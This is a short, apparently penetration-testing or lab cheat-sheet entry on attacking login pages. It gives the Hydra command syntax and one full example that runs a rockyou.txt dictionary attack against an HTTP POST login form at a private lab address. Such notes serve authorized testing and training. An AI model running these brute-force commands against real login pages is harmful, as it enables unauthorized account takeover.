# Login Pages

## Hydra

`sudo hydra <-l Username/-L List> <-p password/-P List> <IP> <Method> "<Path>:<RequestBody>:<IncorrectVerbiage>`

Example:
`sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password!"`
